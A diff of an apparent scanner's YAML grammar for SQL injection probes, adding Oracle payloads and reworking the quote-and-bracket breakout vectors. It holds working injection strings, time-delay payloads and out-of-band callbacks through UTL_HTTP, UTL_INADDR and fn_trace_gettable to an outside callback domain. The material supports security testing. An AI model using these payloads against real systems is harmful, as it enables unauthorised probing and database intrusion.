@@ -11,9 +11,15 @@ simple_select:
   - "%mysql_select;"
   - "%mssql_select;"
   - "%postgre_select;"
+    
+oracle_select:
+  - UTL_INADDR.get_host_name('10.0.0.1')
+  - UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
+  - UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
 
 all_select:
   - "%simple_select;"
+  - "%oracle_select;"
 
 stacked:
   - BEGIN DBMS_LOCK.SLEEP(10); END; 
@@ -21,28 +27,27 @@ stacked:
   - select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)
 
 select_vectors:
-  - "%plus;%all_select;" # +sleep(10)
-  - "%plus;%all_select;%close;" #+sleep(10) -- 
-  - "%quote;%plus;%all_select;%plus;%quote;a" # '+sleep(10)+'a
-  - "%quote;)%plus;%all_select;%plus;(%quote;a" # ')+sleep(10)+('a
-  - "%quote;%plus;%all_select;%close;" # '+sleep(10) -- 
-  - "%quote; and %all_select; and %quote;1%quote;=%quote;a" #' and pg_sleep(10) is not null and '1'='a
-  - "%quote;) and %all_select; and (%quote;1%quote;=%quote;a" #') and pg_sleep(10) is not null and ('1'='a
+  - "+%all_select;"
+  - "+%all_select;%close;"
+  - "'+%all_select;+'a"
+  - "')+%all_select;+('a"
+  - "'+%all_select;%close;"
+  - "\"+%all_select;+\"a"
+  - "\")+%all_select;+(\"a"
+  - "\"+%all_select;%close;"
+  - "' and %all_select; and '1'='a"
+  - "') and %all_select; and ('1'='a"
+  - "' and %all_select;%close;"
+  - "\" and %all_select; and \"1\"=\"a"
+  - "\") and %all_select; and (\"1\"=\"a"
+  - "\" and %all_select;%close;"  
   - "(%all_select;)"
   - "(%all_select;)%close;"
-
-plus:
-  - '+'
-  - '||'
-  - ' and '
-
-quote:
-  - "'"
-  - '"'
 
 stacked_to_insert:
   - "%stacked;"
   - "select %simple_select;"
+  - "select %oracle_select; from dual"
 
 stacked_vectors:
   - "%brackets;; %stacked_to_insert;; %comments;"
@@ -56,9 +61,9 @@ close:
   - "%brackets; %comments;"
 
 brackets:
-  - ""
-  - ")"
-  - "))"
+  - " "
+  - ") "
+  - ")) "
   - ")))"
 
 comments:
